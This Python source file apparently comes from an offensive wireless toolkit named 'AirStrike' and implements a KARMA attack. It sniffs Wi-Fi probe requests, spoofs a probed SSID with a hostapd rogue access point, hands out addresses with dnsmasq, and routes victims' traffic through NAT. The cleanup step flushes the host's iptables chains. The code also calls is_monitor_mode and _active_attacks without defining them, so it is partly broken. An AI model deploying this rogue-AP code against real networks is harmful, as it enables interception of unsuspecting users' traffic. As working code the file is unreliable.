# AirStrike/core_attacks/karma_attack.py
import os
import sys
import time
import subprocess
import tempfile
import shutil # For shutil.rmtree

# --- Path Setup & Utility Imports ---
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

try:
    from utils.network_utils import set_monitor_mode, set_managed_mode, run_with_sudo, sniff_probe_requests
    # For KARMA, we might reuse parts of Evil Twin setup for the AP
    from .evil_twin import create_hostapd_config_content, create_dnsmasq_config_content, \
                           setup_evil_twin_network_interface, enable_ip_forwarding_and_nat
except ImportError as e:
    print(f"ERROR (karma_attack.py): Failed to import utils or evil_twin components: {e}")
    # Define placeholders
    def set_monitor_mode(iface): print(f"Placeholder: set_monitor_mode({iface})"); return False
    def set_managed_mode(iface): print(f"Placeholder: set_managed_mode({iface})"); return True
    def run_with_sudo(cmd, timeout=30): return False, "", "Placeholder: run_with_sudo error"
    def sniff_probe_requests(iface, dur): return []
    def create_hostapd_config_content(*args): return "Placeholder hostapd config"
    def create_dnsmasq_config_content(*args): return "Placeholder dnsmasq config"
    def setup_evil_twin_network_interface(*args, **kwargs): return False
    def enable_ip_forwarding_and_nat(*args, **kwargs): return False


def karma_attack_worker(attack_id, network_params, attack_config_params, log_callback, status_callback, stop_event, app_config):
    """
    Worker function for KARMA attacks.
    It sniffs for probe requests and then sets up rogue APs for those SSIDs.
    This is a simplified conceptual KARMA. True KARMA often involves more dynamic AP creation.
    This version will pick one SSID from probes (or use provided one) and set up an AP.
    """
    ap_interface = app_config.get('DEFAULT_INTERFACE', 'wlan0')
    wan_interface = attack_config_params.get('wan_interface', 'eth0') # For internet sharing

    log_callback(attack_id, f"KARMA Attack worker started. AP Interface: {ap_interface}")
    status_callback(attack_id, "initializing", 5)

    # Config for KARMA
    probe_sniff_duration = int(attack_config_params.get('probe_sniff_duration', 30)) # Sniff for 30s
    # If an ESSID is provided in network_params, use that directly. Otherwise, sniff.
    target_essid_from_params = network_params.get('essid')
    
    ap_ip_address = attack_config_params.get('ap_ip', '10.0.1.1') # Different subnet from EvilTwin example
    default_channel = network_params.get('channel', '6') # Use provided channel or default

    # --- Phase 1: Sniff for Probe Requests (if no specific ESSID given) ---
    rogue_ssid_to_spoof = target_essid_from_params
    if not rogue_ssid_to_spoof:
        log_callback(attack_id, f"No target ESSID provided. Sniffing for probe requests for {probe_sniff_duration}s on {ap_interface}...")
        status_callback(attack_id, "sniffing_probes", 10)
        
        # sniff_probe_requests from utils should handle monitor mode for sniffing
        probed_ssids = sniff_probe_requests(ap_interface, probe_sniff_duration) # This returns a list
        
        if stop_event.is_set():
            log_callback(attack_id, "Attack stopped during probe sniffing.")
            status_callback(attack_id, "stopped", 15)
            # Ensure interface is reset if sniff_probe_requests doesn't do it on early exit
            set_managed_mode(ap_interface)
            return

        if not probed_ssids:
            log_callback(attack_id, "No probe requests detected. Cannot proceed with KARMA attack.")
            status_callback(attack_id, "failed", 20)
            set_managed_mode(ap_interface) # Reset mode
            return
        
        # Choose an SSID to spoof. For simplicity, pick the first one.
        # A more advanced KARMA would react to multiple or specific probes.
        rogue_ssid_to_spoof = probed_ssids[0]
        log_callback(attack_id, f"Detected SSIDs: {probed_ssids}. Will attempt to spoof: '{rogue_ssid_to_spoof}'")
    else:
        log_callback(attack_id, f"Using provided ESSID for KARMA: '{rogue_ssid_to_spoof}'")

    status_callback(attack_id, "configuring_ap", 25)

    # --- Phase 2: Setup Rogue AP (similar to Evil Twin) ---
    log_callback(attack_id, f"Configuring Rogue AP for SSID: '{rogue_ssid_to_spoof}', Channel: {default_channel}, AP_IP: {ap_ip_address}")

    tmp_dir = tempfile.mkdtemp(prefix="airstrike_karma_")
    log_callback(attack_id, f"Temporary config directory: {tmp_dir}")

    hostapd_conf_path = os.path.join(tmp_dir, "hostapd_karma.conf")
    dnsmasq_conf_path = os.path.join(tmp_dir, "dnsmasq_karma.conf")

    # For KARMA, hostapd often uses 'ssid=' (empty) or specific SSIDs based on probes.
    # This example uses one chosen SSID.
    hostapd_content = create_hostapd_config_content(ap_interface, rogue_ssid_to_spoof, default_channel)
    dnsmasq_content = create_dnsmasq_config_content(ap_interface, ip_address=ap_ip_address,
                                                  dhcp_range_start="10.0.1.10", dhcp_range_end="10.0.1.50") # Adjusted range

    try:
        with open(hostapd_conf_path, "w") as f: f.write(hostapd_content)
        with open(dnsmasq_conf_path, "w") as f: f.write(dnsmasq_content)
        log_callback(attack_id, "hostapd and dnsmasq config files for KARMA created.")
    except IOError as e:
        log_callback(attack_id, f"Error writing KARMA config files: {e}")
        status_callback(attack_id, "failed", 30)
        if os.path.exists(tmp_dir): shutil.rmtree(tmp_dir)
        return

    # Ensure AP interface is suitable for hostapd (typically managed/AP mode)
    if is_monitor_mode(ap_interface):
        log_callback(attack_id, f"Interface '{ap_interface}' is in monitor mode. Setting to managed for hostapd.")
        if not set_managed_mode(ap_interface):
            log_callback(attack_id, f"Error: Failed to set '{ap_interface}' to managed mode.")
            status_callback(attack_id, "failed", 33)
            if os.path.exists(tmp_dir): shutil.rmtree(tmp_dir)
            return

    if not setup_evil_twin_network_interface(ap_interface, ap_ip_address, log_callback=log_callback, attack_id=attack_id):
        log_callback(attack_id, "Error: Failed to configure KARMA AP network interface.")
        status_callback(attack_id, "failed", 35)
        if os.path.exists(tmp_dir): shutil.rmtree(tmp_dir)
        return
    status_callback(attack_id, "configuring_nat", 40)

    if wan_interface and wan_interface != ap_interface:
        if not enable_ip_forwarding_and_nat(wan_interface, ap_interface, log_callback=log_callback, attack_id=attack_id):
            log_callback(attack_id, "Warning: Failed to configure IP forwarding/NAT for KARMA. Internet sharing may not work.")
        else:
            log_callback(attack_id, "IP forwarding and NAT enabled for KARMA AP.")
    else:
        log_callback(attack_id, "Skipping NAT setup for KARMA (no distinct WAN interface).")
    
    status_callback(attack_id, "starting_services", 45)

    hostapd_process = None
    dnsmasq_process = None
    sudo_prefix = [] if os.geteuid() == 0 else ['sudo']

    try:
        log_callback(attack_id, f"Starting hostapd for KARMA with config: {hostapd_conf_path}")
        hostapd_cmd = sudo_prefix + ["hostapd", "-B", hostapd_conf_path]
        h_success, h_out, h_err = run_with_sudo(" ".join(hostapd_cmd), timeout=10)
        if not h_success:
            log_callback(attack_id, f"hostapd for KARMA potentially failed. Error: {h_err}. Output: {h_out}.")
        else:
            log_callback(attack_id, "hostapd for KARMA started.")
        status_callback(attack_id, "running_hostapd", 50)
        time.sleep(3)

        log_callback(attack_id, f"Starting dnsmasq for KARMA with config: {dnsmasq_conf_path}")
        dnsmasq_cmd = sudo_prefix + ["dnsmasq", "-C", dnsmasq_conf_path, "--no-daemon"]
        dnsmasq_process = subprocess.Popen(dnsmasq_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        log_callback(attack_id, f"dnsmasq for KARMA started (PID: {dnsmasq_process.pid}).")
        status_callback(attack_id, "running", 60) # KARMA AP is now "running"

        while not stop_event.is_set():
            if dnsmasq_process.poll() is not None:
                log_callback(attack_id, f"dnsmasq process for KARMA terminated (code: {dnsmasq_process.returncode}).")
                dns_out, dns_err = dnsmasq_process.communicate()
                log_callback(attack_id, f"dnsmasq STDOUT: {dns_out}")
                log_callback(attack_id, f"dnsmasq STDERR: {dns_err}")
                status_callback(attack_id, "failed", dnsmasq_process.returncode or 80)
                break
            time.sleep(1)

        if stop_event.is_set():
            log_callback(attack_id, "Stop event received for KARMA attack.")
            status_callback(attack_id, "stopping", 90)

    except FileNotFoundError as fnf_err:
        log_callback(attack_id, f"Error: Required command not found for KARMA (hostapd or dnsmasq?). {fnf_err}")
        status_callback(attack_id, "failed", 38)
    except Exception as e:
        log_callback(attack_id, f"An error occurred during KARMA setup/run: {e}")
        status_callback(attack_id, "failed", 39)
    finally:
        log_callback(attack_id, "Cleaning up KARMA attack...")
        if dnsmasq_process and dnsmasq_process.poll() is None:
            log_callback(attack_id, "Terminating dnsmasq for KARMA...")
            dnsmasq_process.terminate()
            try: dnsmasq_process.wait(timeout=5)
            except subprocess.TimeoutExpired: dnsmasq_process.kill()
        
        log_callback(attack_id, "Stopping hostapd for KARMA (using killall)...")
        run_with_sudo("killall hostapd")
        time.sleep(1)

        log_callback(attack_id, "Restoring iptables for KARMA (flushing NAT and FORWARD)...")
        run_with_sudo("iptables -F -t nat")
        run_with_sudo("iptables -F FORWARD")

        log_callback(attack_id, f"Restoring interface '{ap_interface}' to managed mode after KARMA.")
        if not set_managed_mode(ap_interface):
            log_callback(attack_id, f"Warning: Failed to restore '{ap_interface}' to managed mode after KARMA.")

        if os.path.exists(tmp_dir):
            try: shutil.rmtree(tmp_dir)
            except Exception as e_clean: log_callback(attack_id, f"Error removing KARMA temp dir '{tmp_dir}': {e_clean}")
        
        final_status = "stopped" if stop_event.is_set() else (_active_attacks.get(attack_id, {}).get('status', 'unknown_end'))
        if final_status not in ["completed", "failed", "stopped"]:
             status_callback(attack_id, "stopped" if stop_event.is_set() else "completed_unknown", 100)
        log_callback(attack_id, "KARMA Attack worker finished.")

